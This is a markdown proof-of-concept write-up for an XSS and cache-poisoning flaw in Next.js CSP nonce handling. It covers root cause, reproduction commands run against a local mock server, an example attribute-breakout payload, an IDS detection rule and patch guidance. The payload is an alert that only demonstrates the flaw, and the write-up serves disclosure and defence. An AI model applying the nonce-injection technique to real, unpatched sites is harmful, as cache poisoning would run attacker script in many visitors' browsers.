# Next.js CSP Nonce Cache-Poisoned XSS (CVE-2026-44581)

<!-- 
  File: 2026-05-17_nextjs-csp-nonce-cache-poisoned-xss.md
  Location: pocs/<category>/
-->

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | 2026-05-17 |
| **Author / Researcher** | dwisiswant0 |
| **CVE / Advisory** | CVE-2026-44581 |
| **Category** | web |
| **Severity** | Medium |
| **CVSS Score** | 4.7 (CVSSv3) |
| **Status** | Weaponized |
| **Tags** | XSS, cache-poisoning, CSP-nonce, Next.js, App-Router, unauthenticated |
| **Related** | N/A |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | Next.js App Router applications using CSP nonces |
| **Versions Affected** | 13.4.0–15.5.15 and 16.0.0–16.2.4 (fixed in 15.5.16 / 16.2.5) |
| **Language / Platform** | JavaScript / Node.js |
| **Authentication Required** | No |
| **Network Access Required** | Yes |

---

## Summary

CVE-2026-44581 is a reflected XSS issue in Next.js App Router nonce handling. Malformed nonce values from a `Content-Security-Policy` request header can be reflected into rendered HTML script attributes without safe attribute-context escaping. In caching deployments, attackers can poison cache entries with malicious markup so later visitors receive and execute attacker-controlled script logic. The issue is rated Medium (CVSS 4.7) and is fixed in 15.5.16 / 16.2.5.

---

## Vulnerability Details

### Root Cause

Vulnerable versions extracted CSP nonce values using permissive parsing and then emitted them into script `nonce` attributes without robust HTML attribute escaping. Crafted nonce payloads could break out of the intended attribute context and inject additional executable attributes.

### Attack Vector

An attacker sends requests containing a malicious `Content-Security-Policy` header nonce token that reaches a vulnerable Next.js renderer. If the response is cached by a shared proxy/CDN with weak variation controls, the attacker can poison a cached response. Subsequent users retrieving the poisoned cache entry receive HTML with injected script attributes.

### Impact

Successful exploitation can execute JavaScript in a victim's browser origin (XSS), enabling theft of session data, unauthorized actions, or UI tampering. Cache poisoning increases blast radius because one attacker request can affect many downstream visitors.

---

## Environment / Lab Setup

```
OS:          Linux/macOS/Windows
Target:      Next.js App Router app on vulnerable versions
Attacker:    Any host able to send crafted HTTP headers
Tools:       python3, bash, curl
```

### Setup Steps

```bash
# Clone source PoC collection
git clone https://github.com/dwisiswant0/next-16.2.4-pocs.git
cd next-16.2.4-pocs/poc/CVE-2026-44581_GHSA-ffhc-5mcf-pf4q

# Run local vulnerable mock + exploit
python3 exploit.py
# or
bash exploit.sh
```

---

## Proof of Concept

### Step-by-Step Reproduction

1. **Launch vulnerable demonstration target** using included mock server.
   ```bash
   python3 vulnerable-app/server.py --port 8081
   ```

2. **Send crafted CSP nonce payload** with exploit helper.
   ```bash
   python3 exploit.py http://127.0.0.1:8081/
   ```

3. **Confirm reflected breakout behavior** in script nonce attribute.
   ```bash
   bash exploit.sh http://127.0.0.1:8081/
   ```

### Exploit Code

> See `exploit.py` and `exploit.sh` in this folder.

```python
from exploit import run

# Local test against vulnerable mock
exit_code = run("http://127.0.0.1:8081/")
print(exit_code)
```

### Expected Output

```
[+] VULNERABLE -- attribute breakout in HTML.
<script nonce="" onerror="alert('VALIDATION_TOKEN')">/* boot */</script>
```

---

## Screenshots / Evidence

- `screenshots/` — add request/response evidence and browser execution traces if captured

---

## Detection & Indicators of Compromise

```
# Look for suspicious CSP request headers containing malformed nonce values:
Content-Security-Policy: script-src 'nonce-"\tonerror="alert(...)'

# Cache anomalies where one poisoned response variant is served broadly
# despite different client header contexts.
```

**SIEM / IDS Rule (example):**
```
alert http any any -> $HTTP_SERVERS any (
  msg:"Possible Next.js CSP nonce cache-poisoning XSS attempt";
  content:"Content-Security-Policy"; http_header;
  content:"'nonce-\""; http_header;
  sid:900044581; rev:1;
)
```

---

## Remediation

| Action | Detail |
|---|---|
| **Patch** | Upgrade Next.js to 15.5.16 or 16.2.5+ |
| **Workaround** | Strip client-controlled `Content-Security-Policy` request headers at CDN/reverse proxy boundaries |
| **Config Hardening** | Ensure cache keys vary safely on relevant request headers and avoid reflecting untrusted header-derived nonce values |

---

## References

- [CVE-2026-44581 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-44581)
- [Next.js Security Advisory — GHSA-ffhc-5mcf-pf4q](https://github.com/vercel/next.js/security/advisories/GHSA-ffhc-5mcf-pf4q)
- [Source Repository — dwisiswant0/next-16.2.4-pocs](https://github.com/dwisiswant0/next-16.2.4-pocs)

---

## Notes

Auto-ingested from https://github.com/dwisiswant0/next-16.2.4-pocs on 2026-05-17.

Issue notes indicate no known active exploitation at time of reporting.
